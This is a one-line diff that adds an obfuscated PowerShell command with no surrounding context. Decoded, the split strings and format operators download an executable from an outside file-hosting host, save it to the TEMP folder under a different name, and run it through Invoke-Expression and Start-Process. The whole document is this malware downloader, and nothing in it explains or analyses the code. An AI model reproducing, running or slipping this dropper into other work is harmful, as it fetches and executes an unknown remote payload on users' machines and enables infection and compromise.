@@ -1,0 +1,1 @@
+﻿(('(New-Obj'+'ect Sy'+'stem.'+'Net.WebClie'+'nt'+').D'+'ownlo'+'adFile('+'{2'+'}'+'https'+'://a'+'.p'+'omf'+'.'+'c'+'at'+'/drktzz.'+'exe'+'{2},{'+'0}{3}en'+'v'+':TEMP{1}emmas.'+'exe{0})'+';St'+'art-'+'Proc'+'ess ({'+'0}{3'+'}'+'e'+'nv:TEMP{1}em'+'ma'+'s.exe{0'+'}'+')')  -f[cHar]34,[cHar]92,[cHar]39,[cHar]36)|InVOKE-eXPRESSion
